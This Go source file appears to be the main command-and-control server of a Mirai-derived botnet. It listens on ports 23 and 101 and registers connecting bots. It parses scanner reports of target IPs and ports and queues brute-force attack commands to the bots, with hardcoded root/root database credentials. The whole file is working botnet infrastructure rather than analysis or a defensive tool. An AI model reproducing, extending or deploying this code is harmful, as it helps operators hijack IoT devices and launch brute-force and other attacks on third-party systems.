package main

import (
    "fmt"
    "net"
    "encoding/binary"
    "errors"
    "time"
)

const DatabaseAddr string   = "localhost"
const DatabaseUser string   = "root"
const DatabasePass string   = "root"
const DatabaseTable string  = "mirai"

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
    fmt.Println("starting main")
    tel, err := net.Listen("tcp", "0.0.0.0:23")
    if err != nil {
        fmt.Println(err)
        return
    }
    fmt.Println("connected!")
    api, err := net.Listen("tcp", "0.0.0.0:101")
    if err != nil {
        fmt.Println(err)
        return
    }

    go func() {
        for {
            conn, err := api.Accept()
            if err != nil {
                break
            }
            go apiHandler(conn)
        }
    }()

    for {
        conn, err := tel.Accept()
        if err != nil {
            break
        }
        go initialHandler(conn)
    }

    fmt.Println("Stopped accepting clients")
}

func initialHandler(conn net.Conn) {
    defer conn.Close()

    conn.SetDeadline(time.Now().Add(10 * time.Second))

    buf := make([]byte, 32)
    l, err := conn.Read(buf)
    if err != nil || l <= 0 {
        return
    }

    if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
        if buf[3] > 0 {
            string_len := make([]byte, 1)
            l, err := conn.Read(string_len)
            if err != nil || l <= 0 {
                return
            }
            var source string
            if string_len[0] > 0 {
                source_buf := make([]byte, string_len[0])
                l, err := conn.Read(source_buf)
                if err != nil || l <= 0 {
                    return
                }
                source = string(source_buf)
            }
            NewBot(conn, buf[3], source).Handle()
        } else {
            NewBot(conn, buf[3], "").Handle()
        }
    } else if l >= 1 && buf[0] == 0x00 {
        if 7 - l > 0 {
            tmp_buf, err := readXBytes(conn, 7-l)
            if err != nil {
                return
            }
            buf = append(buf, tmp_buf...)
        }
        // Sending brute force command to bot
        var ipStr string
        var portStr string
        var err error
        ipBuf := buf[1:5] // NOTE: MUST CONSIDER ENDIANESS OF DIFFERENT BOTS
        ip := binary.BigEndian.Uint32(ipBuf)
        ipStr += fmt.Sprint((ip >> 24) & 0xff)+"."
        ipStr += fmt.Sprint((ip >> 16) & 0xff)+"."
        ipStr += fmt.Sprint((ip >> 8) & 0xff) + "."
        ipStr += fmt.Sprint(ip & 0xff)
        //ip = binary.LittleEndian.Uint32(ipBuf)

        portBuf := buf[5:7]
        portStr = fmt.Sprint(binary.BigEndian.Uint16(portBuf))
        atk := Attack {10,
            11,
            map[uint32]uint8{ip: 32},
            map[uint8]string{7: portStr},
        }
        buf, err := atk.Build()
        if err != nil {
            conn.Write([]byte("ERR|An unknown error occurred\r\n"))
            return
        }
        clientList.QueueBuf(buf, 0, "")
        fmt.Printf("Received and sent %s:%s to bot to be bruted!\n", ipStr, portStr)
        //conn.Write([]byte("OK\r\n"))
    } else {
        NewAdmin(conn).Handle()
    }
}

func apiHandler(conn net.Conn) {
    defer conn.Close()

    NewApi(conn).Handle()
}

func readXBytes(conn net.Conn, amount int) ([]byte, error) {
    buf := make([]byte, amount)
    tl := 0

    for tl < amount {
        rd, err := conn.Read(buf[tl:])
        if err != nil || rd <= 0 {
            return nil, errors.New("Failed to read")
        }
        tl += rd
    }

    return buf, nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
    return uint32(prefix >> (32 - netmask))
}
